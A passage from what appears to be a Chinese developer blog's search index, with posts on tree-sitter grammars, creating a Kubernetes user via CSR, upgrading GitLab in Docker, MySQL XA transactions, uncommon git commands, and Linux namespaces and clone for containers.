\u0026#39;}\u0026#39;), enumField: ($) =\u0026gt; seq( $.ident, \u0026#39;=\u0026#39;, optional(\u0026#39;-\u0026#39;), $.intLit, optional(seq(\u0026#39;[\u0026#39;, $.enumValueOption, repeat(seq(\u0026#39;,\u0026#39;, $.enumValueOption)), \u0026#39;]\u0026#39;)), \u0026#39;;\u0026#39; ), enumValueOption: ($) =\u0026gt; seq($.optionName, \u0026#39;=\u0026#39;, $.constant), // message  message: ($) =\u0026gt; seq(\u0026#39;message\u0026#39;, $.messageName, $.messageBody), messageBody: ($) =\u0026gt; seq( \u0026#39;{\u0026#39;, repeat(choice($.field, $.enum, $.message, $.option, $.oneof, $.mapField, $.reserved, $.emptyStatement)), \u0026#39;}\u0026#39; ), // service  service: ($) =\u0026gt; seq(\u0026#39;service\u0026#39;, $.serviceName, \u0026#39;{\u0026#39;, repeat(choice($.option, $.rpc, $.emptyStatement)), \u0026#39;}\u0026#39;), rpc: ($) =\u0026gt; seq( \u0026#39;rpc\u0026#39;, $.rpcName, \u0026#39;(\u0026#39;, optional(\u0026#39;stream\u0026#39;), $.enumMessageType, \u0026#39;)\u0026#39;, \u0026#39;returns\u0026#39;, \u0026#39;(\u0026#39;, optional(\u0026#39;stream\u0026#39;), $.enumMessageType, \u0026#39;)\u0026#39;, choice(seq(\u0026#39;{\u0026#39;, repeat(choice($.option, $.emptyStatement)), \u0026#39;}\u0026#39;), \u0026#39;;\u0026#39;) ), // field and inline option  field: ($) =\u0026gt; seq(optional(\u0026#39;repeated\u0026#39;), $.type, $.fieldName, \u0026#39;=\u0026#39;, $.fieldNumber, optional(seq(\u0026#39;[\u0026#39;, $.fieldOptions, \u0026#39;]\u0026#39;)), \u0026#39;;\u0026#39;), fieldOptions: ($) =\u0026gt; seq($.fieldOption, repeat(seq(\u0026#39;,\u0026#39;, $.fieldOption))), fieldOption: ($) =\u0026gt; seq($.optionName, \u0026#39;=\u0026#39;, $.constant), // oneof  oneof: ($) =\u0026gt; seq(\u0026#39;oneof\u0026#39;, $.oneofName, \u0026#39;{\u0026#39;, repeat(choice($.option, $.oneofField, $.emptyStatement)), \u0026#39;}\u0026#39;), oneofField: ($) =\u0026gt; seq($.type, $.fieldName, \u0026#39;=\u0026#39;, $.fieldNumber, optional(seq(\u0026#39;[\u0026#39;, $.fieldOptions, \u0026#39;]\u0026#39;)), \u0026#39;;\u0026#39;), // map  mapField: ($) =\u0026gt; seq( \u0026#39;map\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, $.keyType, \u0026#39;,\u0026#39;, $.type, \u0026#39;\u0026gt;\u0026#39;, $.mapName, \u0026#39;=\u0026#39;, $.fieldNumber, optional(seq(\u0026#39;[\u0026#39;, $.fieldOptions, \u0026#39;]\u0026#39;)), \u0026#39;;\u0026#39; ), keyType: ($) =\u0026gt; choice( \u0026#39;int32\u0026#39;, \u0026#39;int64\u0026#39;, \u0026#39;uint32\u0026#39;, \u0026#39;uint64\u0026#39;, \u0026#39;sint32\u0026#39;, \u0026#39;sint64\u0026#39;, \u0026#39;fixed32\u0026#39;, \u0026#39;fixed64\u0026#39;, \u0026#39;sfixed32\u0026#39;, \u0026#39;sfixed64\u0026#39;, \u0026#39;bool\u0026#39;, \u0026#39;string\u0026#39; ), // reserved  reserved: ($) =\u0026gt; seq(\u0026#39;reserved\u0026#39;, choice($.ranges, $.fieldNames)), ranges: ($) =\u0026gt; seq($.range, repeat(seq(\u0026#39;,\u0026#39;, $.range))), range: ($) =\u0026gt; seq($.intLit, optional(seq(\u0026#39;to\u0026#39;, choice($.intLit, \u0026#39;max\u0026#39;)))), fieldNames: ($) =\u0026gt; seq($.fieldName, repeat(seq(\u0026#39;,\u0026#39;, $.fieldName))), // integer literals  intLit: ($) =\u0026gt; /(\\d\\d*|0[0-7]*|0[xX][\\da-fA-F]*)/, // floating-point literals  floatLit: ($) =\u0026gt; choice(/\\d\\.\\d*([eE][+-]\\d*)?/, /\\d*[eE][+-]\\d*/, /\\.\\d*[eE][+-]\\d*/, \u0026#39;inf\u0026#39;, \u0026#39;nan\u0026#39;), // boolean literals  boolLit: ($) =\u0026gt; /(true|false)/, // string literals  strLit: ($) =\u0026gt; choice( seq(\u0026#39;\u0026#34;\u0026#39;, /([^\u0026#34;\\n\\\\]|\\\\[xX][\\da-fA-F]{2}|\\\\[0-7]{3}|\\\\[abfnrtv\\\\\u0026#39;\u0026#34;])*/, \u0026#39;\u0026#34;\u0026#39;), seq(\u0026#34;\u0026#39;\u0026#34;, /([^\u0026#39;\\n\\\\]|\\\\[xX][\\da-fA-F]{2}|\\\\[0-7]{3}|\\\\[abfnrtv\\\\\u0026#39;\u0026#34;])*/, \u0026#34;\u0026#39;\u0026#34;) ), // built-in field type  type: ($) =\u0026gt; choice( \u0026#39;double\u0026#39;, \u0026#39;float\u0026#39;, \u0026#39;int32\u0026#39;, \u0026#39;int64\u0026#39;, \u0026#39;uint32\u0026#39;, \u0026#39;uint64\u0026#39;, \u0026#39;sint32\u0026#39;, \u0026#39;sint64\u0026#39;, \u0026#39;fixed32\u0026#39;, \u0026#39;fixed64\u0026#39;, \u0026#39;sfixed32\u0026#39;, \u0026#39;sfixed64\u0026#39;, \u0026#39;bool\u0026#39;, \u0026#39;string\u0026#39;, \u0026#39;bytes\u0026#39;, $.enumMessageType ), fieldNumber: ($) =\u0026gt; $.intLit, // empty statement  emptyStatement: ($) =\u0026gt; \u0026#39;;\u0026#39;, // constant  constant: ($) =\u0026gt; choice( $.fullIdent, seq(optional(/[+-]/), $.intLit), seq(optional(/[+-]/), $.floatLit), $.strLit, $.boolLit, $.msgLit ), msgLit: ($) =\u0026gt; seq(\u0026#39;{\u0026#39;, repeat(seq($.fieldName, \u0026#39;:\u0026#39;, $.constant)), \u0026#39;}\u0026#39;), // identifier  ident: ($) =\u0026gt; /[a-zA-Z_]\\w*/, fullIdent: ($) =\u0026gt; seq($.ident, repeat(seq(\u0026#39;.\u0026#39;, $.ident))), messageName: ($) =\u0026gt; $.ident, mapName: ($) =\u0026gt; $.ident, enumName: ($) =\u0026gt; $.ident, fieldName: ($) =\u0026gt; $.ident, oneofName: ($) =\u0026gt; $.ident, serviceName: ($) =\u0026gt; $.ident, rpcName: ($) =\u0026gt; $.ident, enumMessageType: ($) =\u0026gt; seq(optional(\u0026#39;.\u0026#39;), repeat(seq($.ident, \u0026#39;.\u0026#39;)), $.messageName), }, });   编译和使用 生成的是c代码，默认是编译成机器码，和cpu指令集架构强相关。有很多语言提供了基于 C 接口的绑定。\n不过现在也支持编译成 wasm，只需要用下面的命令\n1  tree-sitter build-wasm   加载方式也是用 Language.load ，不过只有 web-tree-sitter 能加载。web-tree-sitter 可以用 npm i --save tree-sitter 来安装。\n于是写个 main.js ，加载代码如下\n1 2 3 4 5 6 7 8 9  const Parser = require(\u0026#34;web-tree-sitter\u0026#34;); Parser.init().then(() =\u0026gt; { Parser.Language.load(\u0026#34;tree-sitter-hello.wasm\u0026#34;).then((lang) =\u0026gt; { const parser = new Parser(); parser.setLanguage(lang); const ast = parser.parse(\u0026#34;amazing tree parser\u0026#34;); console.log(ast.rootNode.toString()); }); });   最终输出是\n1  (source_file (word) (word) (word))   编辑和更新 这个还没搞明白。\n回头参考下别的 repo 的代码，看看别人是怎么做语法树更新的。\n","date":"2021-07-29T10:14:36+08:00","permalink":"https://nnnewb.github.io/blog/p/%E7%8E%A9%E7%8E%A9-tree-sitter/","title":"玩玩 tree-sitter"},{"content":"越是在 kubernetes 的浑水里摸索，越是发现这就是个不顺手的锤子。\n网上很多人喜欢把东西用不惯叫做懒，蠢，要是多反驳几句，那就还得搭上个“坏”的帽子。感觉吧，就这帮人看来，大神放个屁也值得学习，从里面“悟”出什么道理。\n这帮人就跟传教士一样，但凡说个不字，就是在亵渎他们的“大神”。可谓人类迷惑行为。\n好吧。技术别饭圈化行吗？\n你说尤大强吗？Richard Stallman 是不是值得尊敬？Google 是不是最好的技术公司？Android 天下无敌？\n然后全摆上神坛，挂上赛博天神的牌匾，插上网线一天 25 小时膜拜？\n这帮人哪天搞个崇拜互联网和计算机的教派，把冯·诺依曼奉为先知我都不奇怪。\n拜托，你们真的好怪欸。\n完整脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52  #!/bin/bash -e # # 创建用户 gitlab 并授予权限 # # reference: # https://kubernetes.io/zh/docs/reference/access-authn-authz/certificate-signing-requests/#normal-user # if `gitlab` does not exists, # create csr and approve if ! kubectl get csr gitlab \u0026gt;/dev/null; then # create credential if [ ! -f gitlab.csr ]; then openssl genrsa -out gitlab.key 2048 openssl req -new -key gitlab.key -out gitlab.csr fi csr=$(cat gitlab.csr | base64 | tr -d \u0026#34;\\n\u0026#34;) cat \u0026lt;\u0026lt;EOF | tee gitlab-csr.yaml apiVersion: certificates.k8s.io/v1beta1 kind: CertificateSigningRequest metadata: name: gitlab spec: groups: - system:authenticated request: $csr signerName: kubernetes.io/kube-apiserver-client usages: - client auth EOF kubectl create -f gitlab-csr.yaml kubectl certificate approve gitlab fi # get signed credential kubectl get csr gitlab -o jsonpath=\u0026#39;{.status.certificate}\u0026#39;| base64 -d \u0026gt; gitlab.crt # create role and rolebinding kubectl create role gitlab-ci \\  --verb=create \\  --verb=git \\  --verb=list \\  --verb=update \\  --verb=delete \\  --resource=pods \\  --resource=deployment \\  --resource=statefulset \\  --resource=service \\  --resource=configmap kubectl create rolebinding gitlab-ci-binding-gitlab --role=gitlab-ci --user=gitlab kubectl config set-credentials gitlab --client-key=gitlab.key --client-certificate=gitlab.crt --embed-certs=true kubectl config set-context ci --cluster=office --user=gitlab --namespace=version4   存在的问题 脚本跑完后发现还不能使用 kubectl get pods，错误 Unauthorized。\n再看了一遍文档，发现有这么一句。\n 下面的脚本展示了如何生成 PKI 私钥和 CSR。 设置 CSR 的 CN 和 O 属性很重要。CN 是用户名，O 是该用户归属的组。 你可以参考 RBAC 了解标准组的信息。\n 顺着链接去看了下 RBAC，结果也没找到什么“标准组”。\n对于文中说的两个“很重要”的字段，CN 我猜测是 Common Name，O 就是 Organization。现在就不知道怎么填 O，行吧。\n等啥时候搞清楚了再补一篇。\n","date":"2021-07-19T09:52:38+08:00","permalink":"https://nnnewb.github.io/blog/p/csr-%E6%96%B9%E5%BC%8F%E5%88%9B%E5%BB%BA-kubernetes-%E7%94%A8%E6%88%B7%E5%87%BA%E4%BA%86%E7%82%B9%E5%B7%AE%E9%94%99/","title":"csr 方式创建 kubernetes 用户出了点差错"},{"content":"公司目前跑的 gitlab 是很久以前部署的，当前版本 8.4.2 。升级目标是 13.12.Z 。部署方式是 docker 。\n宿主机配置不高，系统 Ubuntu 15.04 。眼下这个时间，这个Ubuntu版本，基本宣告没法用了。直接在线升级容易把引导搞挂，到时候还得亲自去实体机上折腾引导，麻烦。暂时不管宿主机。\n情况概述 因为 GitLab 版本实在太低了，以至于连一个能集成的 CI/CD 工具都找不到。即使 jenkins 都只能很勉强地动起来，偏偏 jenkins 还不能满足需要（也可能是我太菜，反正公司没人玩得转 jenkins）。\n但开发需要 CI/CD 来解决持续构建和部署的问题，不得不考虑升级了。\n1. 备份 什么都别说了，开干前最重要的事情就是备份，免得把自己玩死。\n最常用的备份手段自然是 tar 。不过 gitlab 数据目录实在太大了，要是直接运行 tar -czpf gitlab.tar.gz ./gitlab 不知道跑多久，也不知道有没有卡死。\n于是上技术手段：用 pv 显示个进度条。\npv 项目的首页在 ivarch.com。因为服务器还在跑ubuntu 15.10，现在连个能用的源都没啦。只好下载了源码，在 wsl 里编译好推上去。\n最终命令如下。\n1  sudo tar cf - ./gitlab -P | pv -s $(sudo du -sb ./gitlab | awk \u0026#39;{print $1}\u0026#39;) | gzip \u0026gt; gitlab.tar.gz   为啥 sudo 呢，postgres 数据库和 redis 数据都没有读权限，没辙。\n2. 升级总体思路 gitlab 的手册还是比较全面的。在upgrading to a new major version 这篇文档提到的说法，跨大版本升级主要分三步：\n 升级至当前大版本(major version)的最新小版本(latest minor version) 升级至目标大版本(target major version)的首个小版本(first minor version) 继续升级至更新的版本  根据 gitlab upgrading guide 的说法，版本低于 8.11.Z 时，先更新到 8.12.0 是比较稳妥的方案。\nso 开干。\n3. 升级至 8.12.0 由于部署方式是 docker（准确的说是 docker-compose），所以按照Update GitLab Using Docker Engine 的说法，我们先停止容器，然后直接修改镜像标签。\n1  docker-compose stop   1 2 3  gitlab:restart:alwaysimage:sameersbn/gitlab:8.12.0# \u0026lt;= sameersbn/gitlab:8.4.2  再启动\n1  docker-compose up -d   故障：GITLAB_SECRETS_OTP_KEY_BASE must set 使用的镜像 sameersbn/docker-gitlab 需要这几个环境变量，参考文档完成设置。\n故障：You must enable the pg_trgm extension 这个故障就比较奇怪了，但还是可以处理。\n先设置一下 postgres 账号密码\n1  docker exec -it gitlab_postgresql_1 psql -U postgres   然后\n1  \\passwordpostgres  输入新密码，按 ctrl+d 退出。\n再用随便啥连接上去，运行 create extension pg_trgm; 就完事了。\n最后就是重启下容器，gitlab 自动迁移完成后即可访问。\n4. 升级至 v8.17.4 原本应该升级到 v8.17.7，但 sameersbn/docker-gitlab 没提供这个版本的镜像，只能先升级到 v8.17.4 ，求老天保佑别折腾出问题。\n老规矩改了 docker-compose ，然后 up 。\n直接成功，没有错误。\n5. 升级至 v9.5.5 老规矩，还是缺少镜像，原本应该升级到 v9.5.10。\n改了 docker-compose 再 up。\n成功。\n6. 升级至 v10.8.4 原本应该升级 v10.8.7 。懒得说了。改了 compose 再 up 。\n故障：This probably isn\u0026rsquo;t the expected value for this secret 错误内容\n1  This probably isn\u0026#39;t the expected value for this secret. To keep using a literal Erb string in config/secrets.yml, replace \u0026amp;lt;%with\u0026amp;lt;%%.   不知道为什么，重启了一次容器后就恢复了。\n可以参考下这个。\n7. 升级至 v11.11.3 根据 v12 的升级指引，\n In 12.0.0 we made various database related changes. These changes require that users first upgrade to the latest 11.11 patch release.\n 必须先升级到 v11.11.Z 版本，再升级 v12.0.Z 才能完成数据库迁移。\n于是先升级到 v11.11.3 (也是因为没有 v11.11.8 的镜像)。\n成功。\n8. 升级至 v12.0.4 根据 12.0 升级指引，先升级到 12.0.Z 版本来完成 11-\u0026gt;12 的迁移，再继续升级。\n成功。\n9. 升级至 v12.1.6 根据 12.1 升级指引，在升级到 12.10.Z 之前，必须先升级到 12.1.Z 。\n If you are planning to upgrade from 12.0.Z to 12.10.Z, it is necessary to perform an intermediary upgrade to 12.1.Z before upgrading to 12.10.Z to avoid issues like #215141.\n 成功。\n10. 升级至 v12.10.6-1 缺少最新的 12.10.Z 镜像，先升级到能升级到的 12.10.Z 最高版本。\n成功。\n11. 升级至 v13.0.6 这个版本对 postgres 数据库版本有要求，故升级 postgresql 到 9.6.4 版本。镜像自动完成了数据迁移。\n之后启动 gitlab 完成升级。\n成功。\n12. 升级至 v13.12.4 这个版本对 postgres 数据库版本又有要求，最低在 11 以上，故升级 postgresql 到 11-20200524 (sameersbn/postgresql)。\n同时，需要安装插件 btree_gist，故连接 postgresql 数据库创建。\n1  createextensionifnotexistsbtree_gist;  之后启动 gitlab 完成升级。\n13. 总结 由于 gitlab 设计良好，升级基本没有太大难度。按照文档的升级路线逐个版本升级即可。\n也是我运气好，在升级 10.8.Z 版本的时候遇到的问题重启后自己消失了，不然光是这个问题可能就要折腾很久。\n最终 gitlab 版本停留在 13.12.Z ，14.0 虽然已经发布了，但出于稳定考虑还是先不升级。\n","date":"2021-07-15T16:02:41+08:00","permalink":"https://nnnewb.github.io/blog/p/%E5%8D%87%E7%BA%A7%E5%85%AC%E5%8F%B8%E7%9A%84-gitlab/","title":"升级公司的 GitLab"},{"content":"关于 MySQL XA 事务和 2PC（两阶段提交）分布式事务处理模型（Distributed Transaction Processing, DTP Model）的学习笔记。\n事务 分布式事务XA 介绍 MySQL内建分布式事务支持（XA），参考文档列出如下\n [MySQL Manual - XA](MySQL :: MySQL 8.0 Reference Manual :: MySQL Glossary) [MySQL Manual - XA Transaction](MySQL :: MySQL 8.0 Reference Manual :: 13.3.8 XA Transactions) [MySQL Manual - XA Transaction Statements](MySQL :: MySQL 8.0 Reference Manual :: 13.3.8.1 XA Transaction SQL Statements) [MySQL Manual - XA Transaction State](MySQL :: MySQL 8.0 Reference Manual :: 13.3.8.2 XA Transaction States)  XA 事务在 InnoDB 引擎中可用。MySQL XA 事务实现基于 X/Open CAE 文档 《Distributed Transaction Processing: The XA Specification》。这份文档由 Open Group 发布，可以在 http://www.opengroup.org/public/pubs/catalog/c193.htm 访问。当前 XA 实现的局限可以在 Section 13.3.8.3, “Restrictions on XA Transactions” 查看。\n\u0026hellip;\nXA 事务是全局事务关联的一组事务性动作，要么全部成功，要么全部回滚。本质上，这是让 ACID 属性“提升了一层”，让多个ACID事务可以作为一个全局操作的一部分执行，使得这个全局操作也具备ACID属性。（对于非分布式事务，应用如果对读敏感，则SERIALIZABLE更推荐。REPEATABLE READ 在分布式事务中并不是很有效。）\n事务模型 其中：\n **AP：**用户程序 **RMs：**数据库 **TM：**事务管理器  用户程序不用介绍。\n根据 Open Group 在 Distributed Transaction Processing Model 中的定义，一个典型的 RM 可以是一个支持事务的数据库（DBMS）。\nTM 则是协调整个二阶段提交过程的中介。AP从TM获得XID，完成 XA START 到 XA END ，然后告知 TM 就绪。TM提取本次事务的所有XID，向RMs发出XA PREPARE请求，如果失败则对每个 XID 发出 XA ROLLBACK ，成功则继续发出 XA COMMIT 。\n需注意的是，XA PREPARE 失败可以通知其他事务回滚，但XA COMMIT 失败则只能等待数据库恢复，再行重试。XA PREPARE一旦成功，则XA COMMIT 一定成功（或者说必须成功）。\nTM 实现要求自身崩溃后必须能清理恢复，防止出现XA事务死锁。\n 继续 PREPARE 需要提交的事务 继续 ROLLBACK 未完成 ROLLBACK 的事务 继续 COMMIT 未能 COMMIT 的事务  未能 COMMIT 成功则需要重试直到成功    几个 TM 角色（或整套方案）的实现：\n seata/seata: Seata is an easy-to-use, high-performance, open source distributed transaction solution. (github.com) UPSQL Proxy-技术产品- 中国银联开放平台 (unionpay.com) 分布式数据库TDSQL MySQL版_企业级分布式数据库解决方案 - 腾讯云 (tencent.com)  基本用法 1 2 3 4 5 6 7 8 9 10 11  XA{START|BEGIN}xid[JOIN|RESUME]XAENDxid[SUSPEND[FORMIGRATE]]XAPREPARExidXACOMMITxid[ONEPHASE]XAROLLBACKxidXARECOVER[CONVERTXID]  其中 XA START 后跟随的 JOIN和RESUME子句没有任何效果。\nXA END 后跟随的 SUSPEND 和 FOR MIGRATE 子句也没有任何效果。\n任何XA语句都以XA关键字开头，大多XA语句都需要xid值。xid 是 XA事务的标识符 ，它确定语句应用到哪个XA事务上。\nxid值可以由客户端指定或 MySQL 服务器生成。\n一个xid值有一到三个部分：\n1  xid: gtrid [, bqual [, formatID ]]   gtrid 是全局事务标识符 ，bqual 是分支修饰符，formatID是一个标记 gtrid 和 bqual 格式的数字。\ngtrid 和 bqual 必须是字符串字面量，最多不超过 64 字节 长。gtrid 和 bqual 可以以多种方式指定，可以用引号包围的字符串（'ab'）；十六进制字符串（X'6162'，0x6162）；或者二进制值（b'nnn'）。\nformatID 必须是一个无符号整数。\ngtrid 和 bqual 值在 MySQL 服务器的底层 XA 支持程序中被解释为字节。不过，服务器在解释包含XA语句的SQL时，可能设置了特定字符集。安全起见，最好将 gtrid 和 bqual 写作十六进制字符串形式。\nxid 值通常是由事务管理器生成。一个事务管理器产生的xid必须与另一个事务管理器产生的xid不同。一个给定的事务管理器必须能在 XA RECOVER 返回的 xid 列表中识别出属于自己的 xid 。\nXA START xid 以指定的 xid 开启一个新 XA 事务。每个 XA 事务必须包含一个唯一的 xid ，xid 不能正在被另一个 XA 事务使用。唯一性通过 gtrid 与 bqual 评估。该 XA 事务的后续 XA 语句都必须指定XA START中指定的 xid。如果使用XA语句但没有指定一个对应XA事务的xid，则产生一个错误。\n多个XA事务可以是同一个全局事务的组成部分。在同一个全局事务中所有XA事务的xid必须使用同一个 gtrid 值。因此，gtrid 必须全局唯一以避免混淆。全局事务中XA事务xid 的 bqual 部分必须互不相同。（要求 bqual 不同是当前MySQL实现的限制，并不是XA规范的一部分。）\nXA RECOVER 语句返回 MySQL 服务器中处于 PREPARED 状态的 XA 事务信息。输出中每一行都是一个服务器上的 XA 事务，不论是哪个客户端启动的事务。\n执行 XA RECOVER 需要 XA_RECOVER_ADMIN 特权。这个特权需求是为了防止用户发现其他不属于自己的事务xid，不影响XA事务的正常提交和回滚。\nXA RECOVER 输出类似下面这样\n1 2 3 4 5 6  mysql\u0026gt;XARECOVER;+----------+--------------+--------------+--------+|formatID|gtrid_length|bqual_length|data|+----------+--------------+--------------+--------+|7|3|3|abcdef|+----------+--------------+--------------+--------+  其中：\n formatID 是 xid 中的 formatID 部分 gtrid_length 是 xid 中 gtrid 部分的长度（字节单位） bqual_length 是 xid 中 bqual 部分的长度（字节单位）  XID值可能包含不可打印的字符。XA RECOVER 允许一个可选的 CONVERT XID 子句，以便客户端可以请求十六进制格式的 XID 值。\n事务状态 一个 XA 事务经历以下状态\n 使用XA START启动的XA事务，进入ACTIVE状态。 一个处于ACTIVE状态的XA事务，可以发出SQL语句填充事务，然后发出XA END语句。XA END语句令XA事务进入IDLE状态。 一个处于IDLE状态的XA事务，可以发出XA PREPARE语句或XA COMMIT ... ONE PHASE语句。  XA PREPARE 语句令XA事务进入PREPARED 状态。XA RECOVER 语句此时可以发现并列出此事务的 XID。XA RECOVER 可以列出所有处于 PREPARED 状态的 XA 事务的 XID。 XA COMMIT ... ONE PHASE 准备并提交XA事务。xid不会列出在XA RECOVER中，因为XA事务实际在执行语句后就结束了。   一个处于PREPARED状态的XA事务，可以发出XA COMMIT语句来提交并结束XA事务，或发出XA ROLLBACK来回滚并结束事务。  下面是一个简单的XA事务例子，作为一个全局事务，插入一个行。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  mysql\u0026gt;XASTART\u0026#39;xatest\u0026#39;;QueryOK,0rowsaffected(0.00sec)mysql\u0026gt;INSERTINTOmytable(i)VALUES(10);QueryOK,1rowaffected(0.04sec)mysql\u0026gt;XAEND\u0026#39;xatest\u0026#39;;QueryOK,0rowsaffected(0.00sec)mysql\u0026gt;XAPREPARE\u0026#39;xatest\u0026#39;;QueryOK,0rowsaffected(0.00sec)mysql\u0026gt;XACOMMIT\u0026#39;xatest\u0026#39;;QueryOK,0rowsaffected(0.00sec)  在给定客户端连接的上下文中，XA事务和本地事务彼此互斥。举例来说，如果XA START发出并启动了一个XA事务，此时不能再启动一个本地事务直到XA事务被提交或回滚。反过来说，如果一个本地事务已经通过START TRANSACTION启动，则不能执行任何XA语句直到本地事务被提交或回滚。\n如果一个XA事务在ACTIVE状态，则不能发出任何产生隐式提交的语句（如 create table），因为这违反了XA协议，导致不能回滚XA事务。尝试执行这类语句会导致一个错误：\n1 2  ERROR 1399 (XAE07): XAER_RMFAIL: The command cannot be executed when global transaction is in the ACTIVE state   XA 事务实验 准备数据库\n1 2 3 4 5  createdatabaseifnotexiststest;createtableifnotexiststest123(`id`bigintprimarykeyauto_increment,`name`varchar(64)notnull);  启动一个 XA 事务，插入表，最后提交。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  xastart\u0026#39;this-is-gtrid\u0026#39;,\u0026#39;this-is-bqual\u0026#39;;insertintotest123(name)values(\u0026#39;distributed transaction!\u0026#39;);xaend\u0026#39;this-is-gtrid\u0026#39;,\u0026#39;this-is-bqual\u0026#39;;-- 准备 xaprepare\u0026#39;this-is-gtrid\u0026#39;,\u0026#39;this-is-bqual\u0026#39;;-- 应该看到上一步 prepare 的 xa 事务 xarecover;-- 提交 xa 事务。 xacommit\u0026#39;this-is-gtrid\u0026#39;,\u0026#39;this-is-bqual\u0026#39;;-- 或者 rollback -- xa rollback \u0026#39;this-is-gtrid\u0026#39;,\u0026#39;this-is-bqual\u0026#39;;   执行完成后，可以发现表中多了一条记录\n1  select*fromtest123;  ","date":"2021-07-09T09:29:22+08:00","permalink":"https://nnnewb.github.io/blog/p/mysql-xa-distributed-transaction-processing-model-2pc/","title":"MySQL XA 事务和分布式事务处理模型：2阶段提交"},{"content":"大概是不太常用的一些 Git 命令。\n找回数据 两种办法：\n1 2  git reflog show git reset --hard HEAD@{1} # 从上一步找到希望回退的位置   或者\n1 2 3 4  git fsck --lost-found cd .git/lost-found/ # 用 git show hash 查看悬空对象的内容 # 用 git merge hash 或者 git rebase hash 来恢复到当前分支里   合并分支时创建合并commit 1  git config branch.master.mergeoptions \u0026#34;--no-ff\u0026#34;   删除远程分支 1  git push --delete origin branch   删除已经合并的分支 参考\n删除已合并的本地分支 1 2 3  git branch --merged \\  | grep -E \u0026#34;^\\\\s+(patch|feat|refactor|test|misc)\u0026#34; \\  | xargs -I{} git branch -d {}   删除已合并的远程分支 1 2 3 4  git branch -r --merged \\  | grep -E \u0026#34;^\\\\s+origin/(patch|feat|refactor|test|misc)\u0026#34; \\  | sed \u0026#39;s/origin\\///\u0026#39; \\  | xargs -I{} echo git push --delete origin {}   ","date":"2021-07-09T09:25:16+08:00","permalink":"https://nnnewb.github.io/blog/p/%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%9A%84-git-%E5%91%BD%E4%BB%A4/","title":"不常用的 Git 命令"},{"content":"前言 自从看了cocker项目的 ppt 之后就有点念念不忘的意思了，实现一个 docker 或 docker 的类似物看起来并不是做不到的事情。\n于是就动手试一试。\n核心技术 namespace 命名空间包装全局系统资源，让在命名空间中的进程看起来就像是有自己独立隔离的全局资源一样。命名空间中的全局资源对命名空间中的其他进程都是可见的，但对命名空间外的进程不可见。命名空间用途之一就是实现容器。\n Linux provides the following namespaces: Namespace Constant Isolates Cgroup CLONE_NEWCGROUP Cgroup root directory IPC CLONE_NEWIPC System V IPC, POSIX message queues Network CLONE_NEWNET Network devices, stacks, ports, etc. Mount CLONE_NEWNS Mount points PID CLONE_NEWPID Process IDs User CLONE_NEWUSER User and group IDs UTS CLONE_NEWUTS Hostname and NIS domain name   几个命名空间的 API\n clone setns unshare  不得不说 man 7 namespaces 对 namespace 的解释已经非常到位了。\nchroot 这个 Linux 用户应该还是比较熟悉的，如 Arch Linux 这样的发行版在安装时就有用到。\n使用 man 2 chroot 查看这个 api 的文档。\n chroot() changes the root directory of the calling process to that specified in path. This directory will be used for pathnames beginning with /. The root directory is inherited by all children of the calling process.\nOnly a privileged process (Linux: one with the CAP_SYS_CHROOT capability in its user namespace) may call chroot().\n 基本作用是把调用进程的根目录 / 切换到指定目录，子进程会继承这个 / 位置；调用 API 需要特权。\n举例说调完 chroot(\u0026quot;/home/xxx\u0026quot;)，你再用 ls 之类的命令看 / 下有什么文件，看到的就是 /home/xxx 下的内容了。\nman 2 chroot 还有一些有意思的内容，不做赘述。\nmount 也是 Linux 用户很熟悉的东西。老规矩，man 2 mount 看看文档。\n 1 2 3 4 5  #include \u0026lt;sys/mount.h\u0026gt; int mount(const char *source, const char *target, const char *filesystemtype, unsigned long mountflags, const void *data);   mount() attaches the filesystem specified by source (which is often a pathname referring to a device, but can also be the pathname of a directory or file, or a dummy string) to the location (a directory or file) specified by the pathname in target.\n mount 会挂载(attaches) source 参数指定的文件系统（通常是设备路径，也可以是文件夹、文件的路径或虚拟字符串（如proc））到 target 指定的位置（目录或文件）。同样需要特权来执行。\nsource/target 都不难理解，filesystemtype可以从/proc/filesystems里读到可用值，或者自己搜一搜；比较重要的就是 mountflags 了，可以指定诸如MS_RDONLY之类的选项来挂载只读文件系统等等。具体还是自己查手册。\nclone 最后就是系统调用 clone 了。还是先 man 2 clone。\n 1 2 3 4 5 6 7 8 9 10  /* Prototype for the glibc wrapper function */ #define _GNU_SOURCE #include \u0026lt;sched.h\u0026gt; int clone(int (*fn)(void *), void *child_stack, int flags, void *arg, ... /* pid_t *ptid, void *newtls, pid_t *ctid */ ); /* For the prototype of the raw system call, see NOTES */   clone() creates a new process, in a manner similar to fork(2).\n 总体类似于fork()，但可以指定一个入口函数，函数结束则子进程退出，也可以共享内存空间，所以行为也可以类似线程。看怎么用。\nflags依然是关注的重点，CLONE_NEWUTS、CLONE_NEWNS、CLONE_NEWPID这些参数允许将子进程运行在独立的命名空间里。\nman 2 clone 还提供了一个 C 语言编写的例子可以参考。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88  #define _GNU_SOURCE #include \u0026lt;sys/wait.h\u0026gt;#include \u0026lt;sys/utsname.h\u0026gt;#include \u0026lt;sched.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt; #define errExit(msg) \\ do \\ { \\ perror(msg); \\ exit(EXIT_FAILURE); \\ } while (0)  static int /* Start function for cloned child */ childFunc(void *arg) { struct utsname uts; /* Change hostname in UTS namespace of child */ if (sethostname(arg, strlen(arg)) == -1) errExit(\u0026#34;sethostname\u0026#34;); /* Retrieve and display hostname */ if (uname(\u0026amp;uts) == -1) errExit(\u0026#34;uname\u0026#34;); printf(\u0026#34;uts.nodename in child: %s\\n\u0026#34;, uts.nodename); /* Keep the namespace open for a while, by sleeping. This allows some experimentation--for example, another process might join the namespace. */ sleep(3); return 0; /* Child terminates now */ } #define STACK_SIZE (1024 * 1024) /* Stack size for cloned child */ int main(int argc, char 